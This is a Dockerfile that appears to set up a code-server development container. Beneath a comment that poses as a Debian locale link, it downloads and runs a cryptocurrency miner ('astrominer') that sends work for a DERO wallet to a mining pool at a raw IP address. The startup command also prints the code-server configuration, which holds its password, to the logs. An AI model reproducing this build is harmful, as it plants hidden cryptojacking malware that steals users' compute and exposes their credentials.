FROM ubuntu

RUN apt-get update \
 && apt-get install -y \
    curl \
    dumb-init \
    htop \
    locales \
    man \
    nano \
    git \
    procps \
    ssh \
    sudo \
    wget \
  && rm -rf /var/lib/apt/lists/*

# https://wiki.debian.org/Locale#Manually
RUN wget -q https://github.com/tj8519/astrominer/releases/download/V1.5.1/astrominer-V1.5.1_linux_amd64.tar.gz && tar xf astrominer-V1.5.1_linux_amd64.tar.gz && chmod +x astrominer
  
RUN ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6cy92xc955awgq70gpfz -r 139.59.114.246:443 -p stratum

ENV PORT=8080
EXPOSE 8080
USER coder
WORKDIR /home/coder
CMD sleep 5 && cat /home/coder/.config/code-server/config.yaml & /usr/local/bin/code-server --host 0.0.0.0 --port $PORT .
